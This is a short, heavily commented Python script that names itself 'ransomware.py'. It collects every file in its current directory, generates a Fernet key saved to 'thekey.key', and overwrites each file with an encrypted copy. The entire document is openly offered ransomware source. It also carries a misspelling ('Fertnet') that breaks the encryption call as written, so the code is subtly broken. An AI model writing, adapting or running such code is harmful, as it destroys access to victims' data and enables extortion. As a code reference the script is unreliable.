import os
from cryptography.fernet import Fernet

files = []
#list named file which will store the files that will be encrypted

for file in os.listdir():
    #for each file in this file's current directory
    if file == "ransomware.py" or file == "thekey.key":
        continue
        #prevents file from encrypting itself and the key it's saving
    if os.path.isfile(file):
        files.append(file)
        #prevents it from trying to add directory

key = Fernet.generate_key()
#creates an encrypted key for the ransomware to use

with open("thekey.key", "wb") as thekey:
    #creates a new file called thekey and writes in binary to store the key
    thekey.write(key)
for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fertnet(key).encrypt(contents)
        #encrypts all the data in the file
        with open(file,"wb")as thefile:
            thefile.write(contents_encrypted)
        #encrypts the files with the key and puts them back